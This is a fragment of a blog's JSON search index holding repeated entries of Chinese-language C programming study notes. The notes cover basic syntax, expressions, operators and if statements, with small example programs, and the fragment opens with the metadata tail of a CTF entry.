","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:6","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web378"},{"categories":["Programing"],"content":"C语言学习笔记以及希冀平台样题 ","date":"2023-11-17","objectID":"/c_language_notes/:0:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#"},{"categories":["Programing"],"content":"\rC语言一刷的时候是没有笔记的，开刷Python之后才开始整理笔记，今天开始C语言二刷，顺便做做题，笔记的框架是根据浙大翁凯教授的慕课构建的，随后又根据学校的考试内容进行了整体补充插入，可能会出现小部分内容重复，也可能会存在插入知识点跟前后关联性较小等问题，同时也插入了学校教材中的习题 ","date":"2023-11-17","objectID":"/c_language_notes/:0:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#c语言一刷的时候是没有笔记的开刷python之后才开始整理笔记今天开始c语言二刷顺便做做题笔记的框架是根据浙大翁凯教授的慕课构建的随后又根据学校的考试内容进行了整体补充插入可能会出现小部分内容重复也可能会存在插入知识点跟前后关联性较小等问题同时也插入了学校教材中的习题"},{"categories":["Programing"],"content":"\r1.1解释型语言\u0026编译型语言 有的编程语言要求必须提前将所有源代码一次性转换成二进制指令，也就是生成一个可执行程序（Windows 下的 .exe），比如C语言、C++、Golang、Pascal（Delphi）、汇编等，这种编程语言称为编译型语言，使用的转换工具称为编译器。(编译型) 有的编程语言可以一边执行一边转换，需要哪些源代码就转换哪些源代码，不会生成可执行程序，比如 Python、JavaScript、PHP、Shell、MATLAB 等，这种编程语言称为解释型语言，使用的转换工具称为解释器。(解释型) ","date":"2023-11-17","objectID":"/c_language_notes/:1:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#11解释型语言编译型语言"},{"categories":["Programing"],"content":"\r2.1计算printf(“xx”); 打印xx scanf(\"%d\",\u0026price); 将读取到的整数赋值给price const是一个修饰符，加载变量类型前面，表示“ 不变的”这一属性，即常量 const int AMOUNT = 100 常量变量名常用全大写 浮点数带小数点的数值，浮点数这个词的本意就是指小数点是浮动的，是计算机内部表达非整数(包含分数和无理数)的一种方式，另一种方式叫做定点数(在c语言中不会遇到定点数) 当浮点数和证书放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算 double双精度浮点数，还有float表示单精度浮点数 改进后的例子： 身高单位换算 #include\u003cstdio.h\u003e int main() { printf(\"请分别输入身高的英尺和英寸，\" 如输入\\\"5 7\\\"表示5英尺7英寸：”)； double foot; double inch; scanf(\"%lf %lf\",\u0026foot,\u0026inch); print(\"身高是%f米。\\n\",((foot + inch /12)* 0.3048)); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:2:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#21计算"},{"categories":["Programing"],"content":"\r2.1计算printf(“xx”); 打印xx scanf(\"%d\",\u0026price); 将读取到的整数赋值给price const是一个修饰符，加载变量类型前面，表示“ 不变的”这一属性，即常量 const int AMOUNT = 100 常量变量名常用全大写 浮点数带小数点的数值，浮点数这个词的本意就是指小数点是浮动的，是计算机内部表达非整数(包含分数和无理数)的一种方式，另一种方式叫做定点数(在c语言中不会遇到定点数) 当浮点数和证书放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算 double双精度浮点数，还有float表示单精度浮点数 改进后的例子： 身高单位换算 #include int main() { printf(\"请分别输入身高的英尺和英寸，\" 如输入\\\"5 7\\\"表示5英尺7英寸：”)； double foot; double inch; scanf(\"%lf %lf\",\u0026foot,\u0026inch); print(\"身高是%f米。\\n\",((foot + inch /12)* 0.3048)); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:2:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#const"},{"categories":["Programing"],"content":"\r2.1计算printf(“xx”); 打印xx scanf(\"%d\",\u0026price); 将读取到的整数赋值给price const是一个修饰符，加载变量类型前面，表示“ 不变的”这一属性，即常量 const int AMOUNT = 100 常量变量名常用全大写 浮点数带小数点的数值，浮点数这个词的本意就是指小数点是浮动的，是计算机内部表达非整数(包含分数和无理数)的一种方式，另一种方式叫做定点数(在c语言中不会遇到定点数) 当浮点数和证书放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算 double双精度浮点数，还有float表示单精度浮点数 改进后的例子： 身高单位换算 #include int main() { printf(\"请分别输入身高的英尺和英寸，\" 如输入\\\"5 7\\\"表示5英尺7英寸：”)； double foot; double inch; scanf(\"%lf %lf\",\u0026foot,\u0026inch); print(\"身高是%f米。\\n\",((foot + inch /12)* 0.3048)); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:2:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#浮点数"},{"categories":["Programing"],"content":"\r2.1计算printf(“xx”); 打印xx scanf(\"%d\",\u0026price); 将读取到的整数赋值给price const是一个修饰符，加载变量类型前面，表示“ 不变的”这一属性，即常量 const int AMOUNT = 100 常量变量名常用全大写 浮点数带小数点的数值，浮点数这个词的本意就是指小数点是浮动的，是计算机内部表达非整数(包含分数和无理数)的一种方式，另一种方式叫做定点数(在c语言中不会遇到定点数) 当浮点数和证书放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算 double双精度浮点数，还有float表示单精度浮点数 改进后的例子： 身高单位换算 #include int main() { printf(\"请分别输入身高的英尺和英寸，\" 如输入\\\"5 7\\\"表示5英尺7英寸：”)； double foot; double inch; scanf(\"%lf %lf\",\u0026foot,\u0026inch); print(\"身高是%f米。\\n\",((foot + inch /12)* 0.3048)); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:2:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#double"},{"categories":["Programing"],"content":"\r2.1计算printf(“xx”); 打印xx scanf(\"%d\",\u0026price); 将读取到的整数赋值给price const是一个修饰符，加载变量类型前面，表示“ 不变的”这一属性，即常量 const int AMOUNT = 100 常量变量名常用全大写 浮点数带小数点的数值，浮点数这个词的本意就是指小数点是浮动的，是计算机内部表达非整数(包含分数和无理数)的一种方式，另一种方式叫做定点数(在c语言中不会遇到定点数) 当浮点数和证书放到一起运算时，C会将整数转换成浮点数，然后进行浮点数的运算 double双精度浮点数，还有float表示单精度浮点数 改进后的例子： 身高单位换算 #include int main() { printf(\"请分别输入身高的英尺和英寸，\" 如输入\\\"5 7\\\"表示5英尺7英寸：”)； double foot; double inch; scanf(\"%lf %lf\",\u0026foot,\u0026inch); print(\"身高是%f米。\\n\",((foot + inch /12)* 0.3048)); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:2:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#身高单位换算"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include \u003cstdio.h\u003e int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include\u003cstdio.h\u003e int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#22表达式"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#运算符"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#算子"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#计算时间差"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#求平均值"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#运算符优先级"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#嵌入式赋值"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结合关系"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#递增递减运算符"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#前缀和后缀"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include\u003cstdio.h\u003e int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include\u003cstdio.h\u003e int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include\u003cstdio.h\u003e int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include\u003cmath.h\u003e 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#31判断"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#时间差计算通过if语句改进"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#if语句"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#关系运算符"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#关系运算的结果"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#找零计算器"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() 